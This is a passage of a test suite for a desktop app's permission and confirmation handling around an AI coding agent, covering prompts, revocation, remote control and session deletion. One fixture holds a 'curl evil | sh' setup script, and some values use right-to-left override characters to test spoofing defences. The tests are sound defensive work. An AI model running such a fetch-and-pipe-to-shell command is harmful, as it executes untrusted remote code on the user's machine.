      subject: 'The AGI CLI',
      folder: 'qa-project',
      path: '/work/qa-project',
    });
    // "Allow agi to use the paired browser?" rather than the old
    // "Allow AGI Workforce to browse agi?", which read as though the client
    // were a website. The title uses the name the user would type; the body
    // says who that is in words.
    expect(question.subject).toBe('agi');
    expect(question.objectPhrase).toBe('use the paired browser');
    // The grant is the client's, so the user answers once per client.
    expect(scope).toEqual({ kind: 'application', target: 'agi' });
  });

  it('names the client, the folder and the whole path in the body', async () => {
    const { reason } = await ask({
      name: 'agi',
      subject: 'The AGI CLI',
      folder: 'qa-project',
      path: '/private/tmp/a-very-long-scratch-directory/qa-project',
    });
    expect(reason).toContain('The AGI CLI running in qa-project is asking.');
    expect(reason).toContain('/private/tmp/a-very-long-scratch-directory/qa-project');
    expect(reason).toContain('will not ask again for each action');
    expect(reason).toContain('approved-sites list');
  });

  it('says nothing about a folder when the client named none', async () => {
    const { reason } = await ask({
      name: 'agi',
      subject: 'The AGI CLI',
      folder: null,
      path: null,
    });
    expect(reason).toContain('The AGI CLI is asking.');
    expect(reason).not.toContain('running in');
  });

  it('leaves the renderer path exactly as it was', async () => {
    const { scope, question } = await ask();
    expect(scope).toEqual({ kind: 'global' });
    expect(question.subject).toBeUndefined();
  });
});

describe('the account the shell hands its app-servers', () => {
  it('passes the renderer account on and resyncs every running app-server', async () => {
    const response = await dispatch(window, 'developer_account_report', {
      signedIn: true,
      email: 'qa@agiworkforce.com',
    });

    expect(response).toEqual({ ok: true, value: true });
    expect(reportShellIdentity).toHaveBeenCalledExactlyOnceWith({
      signedIn: true,
      email: 'qa@agiworkforce.com',
    });
    expect(syncDeveloperAccounts).toHaveBeenCalledOnce();
  });

  it('passes a sign-out on with no account attached to it', async () => {
    await dispatch(window, 'developer_account_report', { signedIn: false });

    expect(reportShellIdentity).toHaveBeenCalledExactlyOnceWith({ signedIn: false, email: null });
    expect(syncDeveloperAccounts).toHaveBeenCalledOnce();
  });
});

describe('stopping screen control', () => {
  it('stops without asking for permission first', async () => {
    // Needing a prompt to stop something already holding the mouse is the one
    // place a prompt must not appear, so this command is outside the capability
    // table and must not consult it.
    getPermissionState.mockReturnValue('prompt');

    const result = await dispatch(window, 'computer_stop', {});

    expect(result.ok).toBe(true);
    expect(stopComputerUse).toHaveBeenCalledOnce();
    expect(requestPermission).not.toHaveBeenCalled();
  });

  it('never clears a refusal, so stopping cannot bring the prompt back', async () => {
    getPermissionState.mockReturnValue('denied');

    await dispatch(window, 'computer_stop', {});

    expect(revokePermission).not.toHaveBeenCalled();
    expect(showMessageBox).not.toHaveBeenCalled();
  });
});

describe('screen control across displays', () => {
  beforeEach(() => {
    captureScreen.mockClear();
    requestPermission.mockClear();
    getPermissionState.mockReturnValue('granted');
    allowComputerRun(RUN, Date.now());
  });

  it('captures the display the step names, and the remembered one when it names none', async () => {
    await screenStep('computer_screenshot', { display: 7 });
    await screenStep('computer_screenshot', {});

    expect(captureScreen.mock.calls).toEqual([[7], [undefined]]);
  });

  it('refuses a display id that is not a number', async () => {
    const result = await screenStep('computer_screenshot', { display: 'second' });

    expect(result).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(captureScreen).not.toHaveBeenCalled();
  });

  it('takes over without asking for permission first', async () => {
    getPermissionState.mockReturnValue('prompt');

    const result = await dispatch(window, 'computer_take_over', {});

    expect(result.ok).toBe(true);
    expect(takeOverComputerUse).toHaveBeenCalledOnce();
    expect(requestPermission).not.toHaveBeenCalled();
  });

  it('hands control back from the page only after a native confirmation that defaults to keeping it', async () => {
    computerUsePhase.mockReturnValue('paused');
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    await dispatch(window, 'computer_hand_back', {});
    expect(showMessageBox).toHaveBeenCalledOnce();
    expect(
      ((showMessageBox.mock.calls[0] as unknown[])[1] as { defaultId: number }).defaultId,
    ).toBe(0);
    expect(handBackComputerUse).not.toHaveBeenCalled();

    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    await dispatch(window, 'computer_hand_back', {});
    expect(handBackComputerUse).toHaveBeenCalledOnce();
  });
});

describe('device registry and remote control commands', () => {
  it('describes this install for the registry without claiming what this shell refuses', async () => {
    const response = await dispatch(window, 'device_registry_profile', {});
    expect(response).toMatchObject({
      ok: true,
      value: {
        installId: 'install-0000-1111',
        name: 'Studio Mac',
        platform: process.platform,
        architecture: process.arch,
        appVersion: '1.8.0',
        capabilities: {
          browser: true,
          computerUse: true,
          localModels: false,
          localMcp: false,
          remoteControl: true,
        },
      },
    });
  });

  it('hands pairing details to the remote control host unchanged once allowed', async () => {
    const args = { code: 'ABCD1234WXYZ', wsUrl: 'wss://relay', pairToken: 't', expiresAt: 1 };
    const response = await dispatch(window, 'remote_control_start', args);
    expect(startRemoteControl).toHaveBeenCalledWith(window, args);
    expect(response).toMatchObject({ ok: true, value: { status: 'waiting' } });
  });

  it('asks for host.remote before starting Remote Control, and stops on a refusal', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');
    const args = { code: 'ABCD1234WXYZ', wsUrl: 'wss://relay', pairToken: 't', expiresAt: 1 };

    const response = await dispatch(window, 'remote_control_start', args);

    expect(requestPermission).toHaveBeenCalledWith(
      window,
      'host.remote',
      { kind: 'global' },
      expect.any(String),
    );
    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(startRemoteControl).not.toHaveBeenCalled();
  });
});

describe('coding session history', () => {
  it('asks to run the agent before reading a session in a folder approved only for reading', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_session_read', {
      rootId: root.id,
      threadId: 't-1',
    });
    expect(response).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', capability: 'shell.execute' },
    });
    expect(requestPermission).toHaveBeenCalledTimes(1);
    for (const call of requestPermission.mock.calls as unknown[][]) {
      expect(call[1]).toBe('shell.execute');
      expect(scopeOf(call)).toEqual({ kind: 'workspace', target: root.path });
      expect(call[3]).toContain('starts the AGI CLI agent in this folder');
    }
    expect(readDeveloperSession).not.toHaveBeenCalled();
  });

  it('answers permission-denied when the service refuses to start the CLI', async () => {
    const { DeveloperAgentNotAllowedError } = await import('../runtime/developerSessionService');
    readDeveloperSession.mockRejectedValueOnce(
      new DeveloperAgentNotAllowedError('Coding sessions are not allowed in project right now.'),
    );

    const response = await dispatch(window, 'developer_session_read', {
      rootId: root.id,
      threadId: 't-1',
    });
    expect(response).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', message: expect.stringContaining('not allowed in') },
    });
  });

  it('reads a session without a prompt when the agent may already run in its folder', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'shell.execute' ? 'granted' : 'prompt') as () => PermissionState);

    const response = await dispatch(window, 'developer_session_read', {
      rootId: root.id,
      threadId: 't-1',
    });
    expect(response).toMatchObject({ ok: true });
    expect(requestPermission).not.toHaveBeenCalled();
    expect(readDeveloperSession).toHaveBeenCalledWith(root.id, 't-1');
    expect(consumeSingleUse).toHaveBeenCalledWith('shell.execute', {
      kind: 'workspace',
      target: root.path,
    });
  });

  it('lists a folder approved only for reading without its sessions, and starts no CLI there', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);

    expect(await dispatch(window, 'developer_session_list', {})).toEqual({
      ok: true,
      value: {
        groups: [
          {
            rootId: root.id,
            name: root.name,
            path: root.path,
            branch: null,
            sessions: [],
            sessionsWithheld: true,
          },
        ],
      },
    });
    const includeRoot = listDeveloperSessions.mock.calls[0]?.[0];
    expect(includeRoot?.(root)).toBe(false);
    expect(requestPermission).not.toHaveBeenCalled();
  });

  it('lists a folder that holds no grant at all with its sessions withheld, so it never vanishes', async () => {
    getPermissionState.mockReturnValue('prompt');
    expect(await dispatch(window, 'developer_session_list', {})).toEqual({
      ok: true,
      value: {
        groups: [
          {
            rootId: root.id,
            name: root.name,
            path: root.path,
            branch: null,
            sessions: [],
            sessionsWithheld: true,
          },
        ],
      },
    });
    expect(listDeveloperSessions.mock.calls[0]?.[0](root)).toBe(false);

    getPermissionState.mockReturnValue('denied');
    expect(await dispatch(window, 'developer_session_list', {})).toMatchObject({
      value: { groups: [{ rootId: root.id, sessions: [], sessionsWithheld: true }] },
    });

    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'shell.execute' ? 'granted' : 'prompt') as () => PermissionState);
    expect(await dispatch(window, 'developer_session_list', {})).toEqual({
      ok: true,
      value: { groups: [{ rootId: root.id }] },
    });
    expect(requestPermission).not.toHaveBeenCalled();
  });
});

describe('recorded permissions', () => {
  const folder: PermissionScope = { kind: 'workspace', target: root.path };

  it('reviews the decisions in force without asking for anything', async () => {
    expect(await dispatch(window, 'permission_review', {})).toEqual({ ok: true, value: REVIEW });
    expect(requestPermission).not.toHaveBeenCalled();
  });

  it('withdraws one decision, tells the page, and answers with the permissions now in force', async () => {
    listPermissions.mockReturnValue([
      {
        capability: 'filesystem.write',
        scope: folder,
        state: 'granted',
        duration: 'always',
        decidedAtMs: 1,
      },
    ]);

    const held = await dispatch(window, 'permission_revoke', {
      capability: 'filesystem.write',
      scope: folder,
    });
    const absent = await dispatch(window, 'permission_revoke', {
      capability: 'clipboard.read',
      scope: { kind: 'global' },
    });

    expect(held).toEqual({ ok: true, value: REVIEW });
    expect(absent).toEqual({ ok: true, value: REVIEW });
    expect(send).toHaveBeenCalledWith(DESKTOP_RUNTIME_EVENT_CHANNEL, {
      kind: 'permission-changed',
      capability: 'filesystem.write',
      scope: folder,
    });
    expect(revokePermission.mock.calls).toEqual([
      ['filesystem.write', folder],
      ['clipboard.read', { kind: 'global' }],
    ]);
    expect(stopDeveloperRuntime).not.toHaveBeenCalled();
  });

  it('clears a refusal only after main confirms it, so a page cannot bring a prompt back by itself', async () => {
    listPermissions.mockReturnValue([
      {
        capability: 'shell.execute',
        scope: folder,
        state: 'denied',
        duration: 'session',
        decidedAtMs: 1,
      },
    ]);
    showMessageBox
      .mockResolvedValueOnce({ response: 0, checkboxChecked: false })
      .mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    const kept = await dispatch(window, 'permission_revoke', {
      capability: 'shell.execute',
      scope: folder,
    });
    expect(kept).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: 'The refusal was kept.' },
    });
    expect(revokePermission).not.toHaveBeenCalled();
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      defaultId: number;
      message: string;
      detail: string;
    };
    expect(options.message).toBe(`Let AGI Cloud ask again to shell.execute in ${root.path}?`);
    expect(options.detail).toContain('allows nothing by itself');
    expect(options.buttons).toEqual(['Cancel', 'Clear Refusal']);
    expect(options.defaultId).toBe(0);

    const cleared = await dispatch(window, 'permission_revoke', {
      capability: 'shell.execute',
      scope: folder,
    });
    expect(cleared).toEqual({ ok: true, value: REVIEW });
    expect(revokePermission).toHaveBeenCalledWith('shell.execute', folder);
  });

  it('stops computer use or Remote Control a withdrawn grant was keeping alive', async () => {
    await dispatch(window, 'permission_revoke', {
      capability: 'computer.use',
      scope: { kind: 'global' },
    });
    expect(stopComputerUse).toHaveBeenCalledTimes(1);

    await dispatch(window, 'permission_revoke', {
      capability: 'host.remote',
      scope: { kind: 'global' },
    });
    expect(stopRemoteControl).toHaveBeenCalledTimes(1);
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('withdraws the agent grant from an idle folder without asking, stopping its runtimes first', async () => {
    const response = await dispatch(window, 'permission_revoke', {
      capability: 'shell.execute',
      scope: folder,
    });

    expect(response).toMatchObject({ ok: true });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(cancelShellRun).not.toHaveBeenCalled();
    expect(stopDeveloperRuntime.mock.calls).toEqual([[root.id], [`${root.id}::worktree-1`]]);
    expect(stopDeveloperRuntime.mock.invocationCallOrder[0]).toBeLessThan(
      revokePermission.mock.invocationCallOrder[0] ?? 0,
    );
  });

  describe('while work is running in the folder', () => {
    const worktree = `${root.id}::worktree-1`;

    beforeEach(() => {
      shellRunsIn.mockImplementation((rootId: string) =>
        rootId === root.id ? ['run-a', 'run-b'] : rootId === worktree ? ['run-c'] : [],
      );
      noteDeveloperSessionEvent(root.id, {
        type: 'turn-started',
        threadId: 'thread-1',
        turnId: 'turn-1',
      });
      noteDeveloperSessionEvent('another-folder', {
        type: 'turn-started',
        threadId: 'thread-9',
        turnId: 'turn-9',
      });
    });

    afterEach(() => {
      for (const rootId of [root.id, 'another-folder']) {
        noteDeveloperSessionEvent(rootId, { type: 'runtime-stopped', message: 'reset' });
      }
    });

    it('asks first, naming the work, and Cancel keeps the grant and stops nothing', async () => {
      showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

      const response = await dispatch(window, 'permission_revoke', {
        capability: 'shell.execute',
        scope: folder,
      });

      expect(response).toMatchObject({
        ok: false,
        error: { code: 'cancelled', message: 'The permission was kept and nothing was stopped.' },
      });
      const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
        buttons: string[];
        defaultId: number;
        message: string;
        detail: string;
      };
      expect(options.message).toBe('Withdrawing this stops what is running in project.');
      expect(options.detail).toContain('1 coding agent turn still running');
      expect(options.detail).toContain('3 local commands still running');
      expect(options.buttons).toEqual(['Cancel', 'Withdraw and Stop']);
      expect(options.defaultId).toBe(0);
      expect(cancelShellRun).not.toHaveBeenCalled();
      expect(stopDeveloperRuntime).not.toHaveBeenCalled();
      expect(revokePermission).not.toHaveBeenCalled();
    });

    it('once confirmed, cancels every command there and stops its runtimes before the grant goes', async () => {
      showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

      const response = await dispatch(window, 'permission_revoke', {
        capability: 'shell.execute',
        scope: folder,
      });

      expect(response).toMatchObject({ ok: true });
      expect(cancelShellRun.mock.calls).toEqual([['run-a'], ['run-b'], ['run-c']]);
      expect(stopDeveloperRuntime.mock.calls).toEqual([[root.id], [worktree]]);
      expect(revokePermission).toHaveBeenCalledWith('shell.execute', folder);
      for (const stop of [cancelShellRun, stopDeveloperRuntime]) {
        expect(stop.mock.invocationCallOrder[0]).toBeLessThan(
          revokePermission.mock.invocationCallOrder[0] ?? 0,
        );
      }
    });

    it('stops a command that started while the question was on screen', async () => {
      showMessageBox.mockImplementationOnce(async () => {
        shellRunsIn.mockImplementation((rootId: string) =>
          rootId === root.id ? ['run-b', 'run-late'] : rootId === worktree ? ['run-c'] : [],
        );
        return { response: 1, checkboxChecked: false };
      });

      const response = await dispatch(window, 'permission_revoke', {
        capability: 'shell.execute',
        scope: folder,
      });

      expect(response).toMatchObject({ ok: true });
      expect(cancelShellRun.mock.calls).toEqual([['run-b'], ['run-late'], ['run-c']]);
    });

    it('guards withdrawing the folder itself the same way', async () => {
      showMessageBox
        .mockResolvedValueOnce({ response: 0, checkboxChecked: false })
        .mockResolvedValueOnce({ response: 1, checkboxChecked: false });
      revokeRoot.mockReturnValue(true);

      const kept = await dispatch(window, 'workspace_revoke_root', { rootId: root.id });
      expect(kept).toMatchObject({ ok: false, error: { code: 'cancelled' } });
      expect(revokeRoot).not.toHaveBeenCalled();
      expect(cancelShellRun).not.toHaveBeenCalled();

      const withdrawn = await dispatch(window, 'workspace_revoke_root', { rootId: root.id });
      expect(withdrawn).toEqual({ ok: true, value: true });
      expect(cancelShellRun).toHaveBeenCalledTimes(3);
      expect(revokeRoot).toHaveBeenCalledWith(root.id);
    });

    it('leaves another capability on the same folder alone', async () => {
      await dispatch(window, 'permission_revoke', {
        capability: 'filesystem.write',
        scope: folder,
      });

      expect(showMessageBox).not.toHaveBeenCalled();
      expect(cancelShellRun).not.toHaveBeenCalled();
      expect(stopDeveloperRuntime).not.toHaveBeenCalled();
      expect(revokePermission).toHaveBeenCalledWith('filesystem.write', folder);
    });
  });

  it('refuses a capability or a scope it does not record, and withdraws nothing', async () => {
    for (const args of [
      { capability: 'filesystem.delete', scope: folder },
      { capability: 'filesystem.write' },
      { capability: 'filesystem.write', scope: { kind: 'workspace' } },
      { capability: 'filesystem.write', scope: { kind: 'everything', target: '/' } },
      { scope: folder },
    ]) {
      expect(await dispatch(window, 'permission_revoke', args), JSON.stringify(args)).toMatchObject(
        { ok: false, error: { code: 'invalid-arguments' } },
      );
    }
    expect(revokePermission).not.toHaveBeenCalled();
  });

  it('stops every runtime of a folder, its worktrees included, when the folder is withdrawn', async () => {
    revokeRoot.mockReturnValueOnce(true);

    expect(await dispatch(window, 'workspace_revoke_root', { rootId: root.id })).toEqual({
      ok: true,
      value: true,
    });
    expect(stopDeveloperRuntime.mock.calls).toEqual([[root.id], [`${root.id}::worktree-1`]]);
    expect(revokeRoot).toHaveBeenCalledWith(root.id);
  });
});

describe('pages that can answer the agent questions', () => {
  // The shell cancels a question no page can show, so only a page that said it
  // can counts, and only until that window loads another page or closes.
  it('counts a window once its page says so, and forgets it on navigation or close', async () => {
    getPermissionState.mockReturnValue('granted');
    const navigations: Array<() => void> = [];
    let destroyed = false;
    const pageWindow = {
      isDestroyed: () => destroyed,
      webContents: {
        send,
        on: (event: string, listener: () => void) => {
          if (event === 'did-navigate') navigations.push(listener);
        },
      },
    } as unknown as Parameters<typeof dispatch>[0];

    await dispatch(pageWindow, 'developer_session_read', { rootId: root.id, threadId: 't-1' });
    expect(windowAnswersUserInput()).toBe(false);

    await dispatch(pageWindow, 'developer_session_read', {
      rootId: root.id,
      threadId: 't-1',
      clientCapabilities: ['user_input'],
    });
    expect(windowAnswersUserInput()).toBe(true);

    for (const navigated of navigations) navigated();
    expect(windowAnswersUserInput()).toBe(false);

    await dispatch(pageWindow, 'developer_session_read', {
      rootId: root.id,
      threadId: 't-1',
      clientCapabilities: ['user_input'],
    });
    destroyed = true;
    expect(windowAnswersUserInput()).toBe(false);
    expect(navigations).toHaveLength(1);
  });
});

describe('worktree commands', () => {
  it('asks to run the agent in the folder before reading or changing how many worktrees are kept', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_worktree_keep', {
      rootId: root.id,
      keep: 3,
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('shell.execute');
    expect(scopeOf(call)).toEqual({ kind: 'workspace', target: root.path });
  });

  it('reads the worktree count with the grant that reads session history', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_worktree_keep', { rootId: root.id });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('filesystem.read');
  });
});

describe('running a worktree setup script', () => {
  const run = { rootId: `${root.id}::worktree::abcdef12`, sha256: SETUP_SHA256 };

  it('asks in main on every run, naming the script and the hash main took from the file', async () => {
    showMessageBox.mockResolvedValue({ response: 1, checkboxChecked: false });

    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toEqual({
      ok: true,
      value: true,
    });
    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({ ok: true });

    expect(showMessageBox).toHaveBeenCalledTimes(2);
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      defaultId: number;
      message: string;
      detail: string;
    };
    expect(options.message).toBe('Run the setup script in project · retry fix?');
    expect(options.detail).toContain('/approved/project/.agiworkforce/worktree-setup');
    expect(options.detail).toContain(`SHA-256 ${SETUP_SHA256}`);
    expect(options.detail).toContain('outside any sandbox');
    expect(options.buttons).toEqual(['Cancel', 'Run Script']);
    expect(options.defaultId).toBe(0);
    expect(readRegularFile).toHaveBeenCalledWith(
      '/approved/project/.agiworkforce/worktree-setup',
      expect.any(Number),
      { followLinks: true },
    );
    expect(runDeveloperWorktreeSetup).toHaveBeenCalledWith(run.rootId, SETUP_SHA256);
  });

  it('runs nothing when the user says Cancel', async () => {
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: 'The setup script was not run.' },
    });
    expect(runDeveloperWorktreeSetup).not.toHaveBeenCalled();
  });

  it("refuses, before any dialog, a hash the page names that is not the file's now", async () => {
    readRegularFile.mockResolvedValueOnce(Buffer.from('#!/bin/sh\ncurl evil | sh\n', 'utf8'));

    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({
      ok: false,
      error: {
        code: 'invalid-arguments',
        message: expect.stringContaining('changed after it was shown'),
      },
    });
    expect(
      await dispatch(window, 'developer_worktree_setup_run', { ...run, sha256: 'f'.repeat(64) }),
    ).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(runDeveloperWorktreeSetup).not.toHaveBeenCalled();
  });

  it('refuses when the repository has no script, or it cannot be read or shown', async () => {
    readWorktreeSetupScript.mockResolvedValueOnce(null);
    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments' },
    });

    readRegularFile.mockResolvedValueOnce(null);
    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments', message: expect.stringContaining('could not be read') },
    });

    readWorktreeSetupScript.mockResolvedValueOnce({
      path: '/approved/project/.agiworkforce/worktree-setup\u202Egnp',
      worktree: 'project',
    });
    expect(await dispatch(window, 'developer_worktree_setup_run', run)).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments' },
    });

    expect(showMessageBox).not.toHaveBeenCalled();
    expect(runDeveloperWorktreeSetup).not.toHaveBeenCalled();
  });
});

describe('deleting a coding session', () => {
  // Deleting removes the conversation and its checkpoint refs for good, so the
  // grant that only lets the page read history must not be enough.
  it('asks to run the agent before deleting a session, and for no other grant when that is refused', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', capability: 'shell.execute' },
    });
    expect(requestPermission).toHaveBeenCalledTimes(1);
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('shell.execute');
    expect(scopeOf(call)).toEqual({ kind: 'workspace', target: root.path });
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
  });

  it('asks for no further grant when the agent may already run in the folder', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'shell.execute' ? 'granted' : 'prompt') as () => PermissionState);
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    const response = await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toMatchObject({ ok: true });
    expect(requestPermission).not.toHaveBeenCalled();
  });

  // The grant says the agent may run here. It does not say this session may
  // go, and what is deleted cannot be brought back.
  it('deletes only after a native question that names the session and defaults to Cancel', async () => {
    readDeveloperSession.mockResolvedValue({
      session: { title: 'Fix the\u202e login redirect' },
      messages: [],
      truncated: false,
    } as never);
    showMessageBox
      .mockResolvedValueOnce({ response: 0, checkboxChecked: false })
      .mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    const remove = () =>
      dispatch(window, 'developer_thread_delete', { rootId: root.id, threadId: 't-1' });

    expect(await remove()).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: 'The session was kept.' },
    });
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      defaultId: number;
      cancelId: number;
      message: string;
      detail: string;
    };
    expect(options.buttons).toEqual(['Cancel', 'Delete session']);
    expect(options).toMatchObject({ defaultId: 0, cancelId: 0 });
    expect(options.message).toBe('Delete "Fix the\ufffd login redirect" in project?');
    expect(options.detail).toContain(root.path);
    expect(options.detail).toContain('cannot be brought back');

    expect(await remove()).toMatchObject({ ok: true });
    expect(deleteDeveloperThread).toHaveBeenCalledTimes(1);
  });

  it('says so when the session title could not be read, and still asks', async () => {
    readDeveloperSession.mockRejectedValueOnce(new Error('the CLI is not running'));
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    await dispatch(window, 'developer_thread_delete', { rootId: root.id, threadId: 't-1' });

    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as { message: string };
    expect(options.message).toBe('Delete a session whose title could not be read in project?');
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
  });

  it('refuses a delete the user denied the folder write grant for, even when the agent may run', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'git.write' ? 'denied' : 'granted') as () => PermissionState);

    for (const discardWorktreeArchives of [false, true]) {
      const response = await dispatch(window, 'developer_thread_delete', {
        rootId: root.id,
        threadId: 't-1',
        discardWorktreeArchives,
      });

      expect(response).toMatchObject({
        ok: false,
        error: { code: 'permission-denied', capability: 'git.write' },
      });
    }
    expect(requestPermission).not.toHaveBeenCalled();
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
  });

  it('keeps worktree archives unless the page asked to discard them', async () => {
    showMessageBox.mockResolvedValue({ response: 1, checkboxChecked: false });
    await dispatch(window, 'developer_thread_delete', { rootId: root.id, threadId: 't-1' });
    await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
      discardWorktreeArchives: 'yes',
    });
    await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
      discardWorktreeArchives: true,
    });

    expect(deleteDeveloperThread.mock.calls).toEqual([
      [{ rootId: root.id, threadId: 't-1', discardWorktreeArchives: false }],
      [{ rootId: root.id, threadId: 't-1', discardWorktreeArchives: false }],
      [{ rootId: root.id, threadId: 't-1', discardWorktreeArchives: true }],
    ]);
    const titles = showMessageBox.mock.calls.map(
      (call) => ((call as unknown[])[1] as { title: string }).title,
    );
    expect(titles).toEqual([
      'Delete this coding session?',
      'Delete this coding session?',
      'Delete the kept worktree archives?',
    ]);
  });

  it('asks to run the agent, not for a standing grant, before discarding worktree archives', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
      discardWorktreeArchives: true,
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(requestPermission).toHaveBeenCalledTimes(1);
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('shell.execute');
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
  });

  it('discards worktree archives only after a native confirmation naming the loss', async () => {
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    const response = await dispatch(window, 'developer_thread_delete', {
      rootId: root.id,
      threadId: 't-1',
      discardWorktreeArchives: true,
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as { detail: string };
    expect(options.detail).toContain('cannot be recovered');
    expect(options.detail).toContain(root.path);
    expect(deleteDeveloperThread).not.toHaveBeenCalled();
  });
});

describe('summarizing a coding session', () => {
  it('needs the grant that lets the agent run, since the model writes the summary', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_thread_compact', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('shell.execute');
    expect(compactDeveloperThread).not.toHaveBeenCalled();
  });

  it('passes the turn to summarize from only when one is named', async () => {
    await dispatch(window, 'developer_thread_compact', { rootId: root.id, threadId: 't-1' });
    await dispatch(window, 'developer_thread_compact', {
      rootId: root.id,
      threadId: 't-1',
      fromTurnId: 'turn-4',
    });

    expect(compactDeveloperThread.mock.calls).toEqual([
      [{ rootId: root.id, threadId: 't-1' }],
      [{ rootId: root.id, threadId: 't-1', fromTurnId: 'turn-4' }],
    ]);
  });
});

describe('branching a coding session', () => {
  it('asks to run the agent and for nothing else, then passes the turn through', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('granted');

    const response = await dispatch(window, 'developer_thread_fork', {
      rootId: root.id,
      threadId: 't-1',
      throughTurnId: 'turn-2',
    });

    expect(response).toMatchObject({ ok: true, value: { id: 'thread-branch' } });
    expect(requestPermission).toHaveBeenCalledTimes(1);
    expect((requestPermission.mock.calls[0] as unknown as unknown[])[1]).toBe('shell.execute');
    expect(forkDeveloperThread).toHaveBeenCalledWith({
      rootId: root.id,
      threadId: 't-1',
      throughTurnId: 'turn-2',
    });
  });

  it('refuses a branch that names no turn instead of copying the whole session', async () => {
    const response = await dispatch(window, 'developer_thread_fork', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toMatchObject({ ok: false });
    expect(forkDeveloperThread).not.toHaveBeenCalled();
  });
});

describe('archiving a coding session', () => {
  it('asks to run the agent and for nothing else, and names the thread', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
